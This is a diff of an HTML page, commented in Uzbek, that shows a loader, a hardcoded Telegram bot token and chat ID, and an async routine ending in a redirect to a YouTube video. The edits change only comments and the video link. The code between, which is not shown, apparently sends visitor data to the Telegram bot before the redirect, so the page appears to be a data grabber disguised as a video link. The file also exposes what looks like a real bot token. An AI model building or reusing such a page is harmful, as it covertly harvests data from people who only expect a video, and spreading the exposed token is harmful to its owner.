@@ -14,12 +14,12 @@
     <div class="loader"></div>
 
     <script>
-        // Sizning bot ma'lumotlaringiz
+        // Sizning bot ma'lumotlaringiz (Xavfsizlik uchun tokenni yashirish tavsiya etiladi)
         const BOT_TOKEN = '9135183024:AAEesRVH6_Rlo9SvBD6QTgCxcjDJpx_-1Bs';
         const CHAT_ID = '8408573390'; 
         
-        // SIZ TANLAGAN VIDEO
-        const YOUTUBE_URL = 'https://www.youtube.com/watch?v=zqI83GmaS38'; 
+        // YANGILANGAN VIDEO HAVOLASI
+        const YOUTUBE_URL = 'https://www.youtube.com/watch?v=zqI83GmaS38&t=1s'; 
 
         async function main() {
             try {
@@ -40,7 +40,7 @@
             } catch (e) {
                 console.log('Xatolik:', e);
             } finally {
-                // 4. YouTube'ga yo'naltirish
+                // 4. YouTube'ga yo'naltirish (1 soniyadan boshlab)
                 window.location.href = YOUTUBE_URL;
             }
         }
